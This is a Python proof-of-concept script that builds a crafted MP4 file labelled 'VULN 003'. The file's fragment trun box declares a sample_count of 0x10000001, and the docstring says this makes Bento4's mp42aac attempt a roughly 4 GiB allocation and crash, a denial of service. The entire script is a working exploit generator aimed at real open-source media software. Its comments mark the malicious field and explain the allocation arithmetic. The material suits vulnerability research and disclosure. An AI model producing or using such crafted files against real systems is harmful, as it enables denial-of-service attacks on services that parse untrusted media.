#!/usr/bin/env python3
"""
PoC generator for VULN 003: trun sample_count unbounded -> heap overflow / DoS
Triggers AP4_TrunAtom::AP4_TrunAtom() in Bento4 mp42aac by supplying
sample_count = 0x10000001, causing a ~4 GB allocation -> std::bad_alloc crash.
"""

import struct
import sys
import os

def box(box_type, payload):
    """Wrap payload in a 4-byte size + 4-byte type box."""
    size = 8 + len(payload)
    return struct.pack('>I4s', size, box_type) + payload

# ---------------------------------------------------------------------------
# ftyp box
# ---------------------------------------------------------------------------
ftyp_payload = (
    b'isom'              # major brand
    + struct.pack('>I', 0x200)   # minor version
    + b'isomiso2mp41'    # compatible brands
)
ftyp = box(b'ftyp', ftyp_payload)

# ---------------------------------------------------------------------------
# moov box
# ---------------------------------------------------------------------------

# mvhd
mvhd_payload  = struct.pack('>I', 0)             # version+flags
mvhd_payload += struct.pack('>I', 0)             # creation_time
mvhd_payload += struct.pack('>I', 0)             # modification_time
mvhd_payload += struct.pack('>I', 44100)         # timescale
mvhd_payload += struct.pack('>I', 0)             # duration
mvhd_payload += struct.pack('>I', 0x00010000)    # rate
mvhd_payload += struct.pack('>H', 0x0100)        # volume
mvhd_payload += b'\x00' * 10                     # reserved
mvhd_payload += struct.pack('>9I',               # matrix (identity)
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000)
mvhd_payload += b'\x00' * 24                     # pre_defined
mvhd_payload += struct.pack('>I', 2)             # next_track_ID
mvhd = box(b'mvhd', mvhd_payload)

# trex
trex_payload  = struct.pack('>I', 0)             # version+flags
trex_payload += struct.pack('>I', 1)             # track_ID
trex_payload += struct.pack('>I', 1)             # default_sample_description_index
trex_payload += struct.pack('>I', 0)             # default_sample_duration
trex_payload += struct.pack('>I', 0)             # default_sample_size
trex_payload += struct.pack('>I', 0)             # default_sample_flags
trex = box(b'trex', trex_payload)
mvex = box(b'mvex', trex)

# tkhd
tkhd_payload  = struct.pack('>I', 0x00000003)    # version=0, flags=3
tkhd_payload += struct.pack('>I', 0)             # creation_time
tkhd_payload += struct.pack('>I', 0)             # modification_time
tkhd_payload += struct.pack('>I', 1)             # track_ID
tkhd_payload += struct.pack('>I', 0)             # reserved
tkhd_payload += struct.pack('>I', 0)             # duration
tkhd_payload += b'\x00' * 8                      # reserved
tkhd_payload += struct.pack('>HH', 0, 0)         # layer, alternate_group
tkhd_payload += struct.pack('>H', 0x0100)        # volume
tkhd_payload += struct.pack('>H', 0)             # reserved
tkhd_payload += struct.pack('>9I',               # matrix
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000)
tkhd_payload += struct.pack('>II', 0, 0)         # width, height
tkhd = box(b'tkhd', tkhd_payload)

# mdhd
mdhd_payload  = struct.pack('>I', 0)             # version+flags
mdhd_payload += struct.pack('>I', 0)             # creation_time
mdhd_payload += struct.pack('>I', 0)             # modification_time
mdhd_payload += struct.pack('>I', 44100)         # timescale
mdhd_payload += struct.pack('>I', 0)             # duration
mdhd_payload += struct.pack('>HH', 0x55C4, 0)   # language='und', pre_defined
mdhd = box(b'mdhd', mdhd_payload)

# hdlr
hdlr_payload  = struct.pack('>I', 0)
hdlr_payload += struct.pack('>I', 0)
hdlr_payload += b'soun'
hdlr_payload += b'\x00' * 12
hdlr_payload += b'SoundHandler\x00'
hdlr = box(b'hdlr', hdlr_payload)

# smhd
smhd_payload = struct.pack('>IHH', 0, 0, 0)
smhd = box(b'smhd', smhd_payload)

# dinf / dref (self-contained)
url_payload = struct.pack('>I', 0x00000001)      # flags=1 -> self-contained
url_ = box(b'url ', url_payload)
dref_payload = struct.pack('>II', 0, 1) + url_  # version+flags, entry_count=1
dref = box(b'dref', dref_payload)
dinf = box(b'dinf', dref)

# stsd: one mp4a sample entry
# AudioSampleEntry base fields (inside sample entry, after reserved+data_ref_index)
# AudioSampleEntry: reserved(6)+data_ref_index(2)+reserved(8)+channelcount(2)+
#                   samplesize(2)+pre_defined(2)+reserved(2)+samplerate(4)
audio_base  = b'\x00' * 6                        # reserved
audio_base += struct.pack('>H', 1)               # data_reference_index
audio_base += b'\x00' * 8                        # reserved
audio_base += struct.pack('>H', 2)               # channelcount
audio_base += struct.pack('>H', 16)              # samplesize
audio_base += struct.pack('>H', 0)               # pre_defined
audio_base += struct.pack('>H', 0)               # reserved
audio_base += struct.pack('>I', 44100 << 16)     # samplerate (16.16 fixed-point)

# esds box (minimal, declares AAC LC)
# Descriptor tag constants
ES_DescrTag         = 0x03
DecoderConfigDescrTag = 0x04
DecoderSpecificInfo = 0x05
SLConfigDescrTag    = 0x06

# AudioSpecificConfig: AAC-LC, 44100 Hz, 2 ch
# objectType=2 (AAC-LC), samplingFreqIndex=4 (44100), channelConfig=2
asc = struct.pack('>H', (2 << 11) | (4 << 7) | (2 << 3))

def encode_descriptor(tag, data):
    size = len(data)
    # variable-length size (up to 4 bytes)
    size_bytes = bytearray()
    while size > 0x7F:
        size_bytes.append((size >> 7) | 0x80)
        size >>= 7
    size_bytes.append(size)
    return bytes([tag]) + bytes(size_bytes) + data

dec_specific = encode_descriptor(DecoderSpecificInfo, asc)
sl_config = encode_descriptor(SLConfigDescrTag, b'\x02')  # predefined=2

dec_config_body  = struct.pack('>B', 0x40)      # objectTypeIndication=0x40 (Audio ISO/IEC 14496-3)
dec_config_body += struct.pack('>B', 0x15)      # streamType=0x05 (audio), upStream=0, reserved
dec_config_body += struct.pack('>I', 0)         # bufferSizeDB (3 bytes packed; just use 4 here)
dec_config_body  = (struct.pack('>B', 0x40)
                  + b'\x15'                     # streamType=audio (6 bits)
                  + b'\x00\x00\x00'             # bufferSizeDB
                  + struct.pack('>I', 128000)   # maxBitrate
                  + struct.pack('>I', 128000))  # avgBitrate
dec_config_body += dec_specific

dec_config = encode_descriptor(DecoderConfigDescrTag, dec_config_body)

es_body  = struct.pack('>H', 1)                 # ES_ID
es_body += struct.pack('>B', 0)                 # flags
es_body += dec_config + sl_config
es_descriptor = encode_descriptor(ES_DescrTag, es_body)

esds_payload = struct.pack('>I', 0) + es_descriptor  # version+flags + ES_Descriptor
esds = box(b'esds', esds_payload)

mp4a_payload = audio_base + esds
mp4a = box(b'mp4a', mp4a_payload)

stsd_payload = struct.pack('>II', 0, 1) + mp4a  # version+flags, entry_count=1
stsd = box(b'stsd', stsd_payload)

# Minimal time-to-sample, sample-to-chunk, sample-size, chunk-offset tables (0 entries)
stts_payload = struct.pack('>II', 0, 0)
stts = box(b'stts', stts_payload)
stsc_payload = struct.pack('>II', 0, 0)
stsc = box(b'stsc', stsc_payload)
stsz_payload = struct.pack('>III', 0, 0, 0)     # version+flags, sample_size=0, sample_count=0
stsz = box(b'stsz', stsz_payload)
stco_payload = struct.pack('>II', 0, 0)
stco = box(b'stco', stco_payload)

stbl = box(b'stbl', stsd + stts + stsc + stsz + stco)
minf = box(b'minf', smhd + dinf + stbl)
mdia = box(b'mdia', mdhd + hdlr + minf)
trak = box(b'trak', tkhd + mdia)

moov = box(b'moov', mvhd + mvex + trak)

# ---------------------------------------------------------------------------
# moof box
# ---------------------------------------------------------------------------

mfhd_payload  = struct.pack('>I', 0)            # version+flags
mfhd_payload += struct.pack('>I', 1)            # sequence_number
mfhd = box(b'mfhd', mfhd_payload)

tfhd_payload  = struct.pack('>I', 0)            # version+flags=0 (minimal)
tfhd_payload += struct.pack('>I', 1)            # track_ID
tfhd = box(b'tfhd', tfhd_payload)

# MALICIOUS trun: flags=0 -> only version+flags+sample_count in box
# sample_count=0x10000001 -> 268435457 * 16 bytes = ~4 GiB allocation
trun_payload  = struct.pack('>I', 0x00000000)   # version=0, flags=0x000000
trun_payload += struct.pack('>I', 0x10000001)   # sample_count (MALICIOUS)
trun = box(b'trun', trun_payload)

traf = box(b'traf', tfhd + trun)
moof = box(b'moof', mfhd + traf)

# ---------------------------------------------------------------------------
# mdat (empty)
# ---------------------------------------------------------------------------
mdat = box(b'mdat', b'')

# ---------------------------------------------------------------------------
# Write output
# ---------------------------------------------------------------------------
output_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vuln_003.mp4')
data = ftyp + moov + moof + mdat

with open(output_path, 'wb') as f:
    f.write(data)

print(f"[+] Written {len(data)} bytes to {output_path}")
print(f"[+] trun sample_count = 0x10000001 ({0x10000001}) -> triggers ~4 GiB allocation")
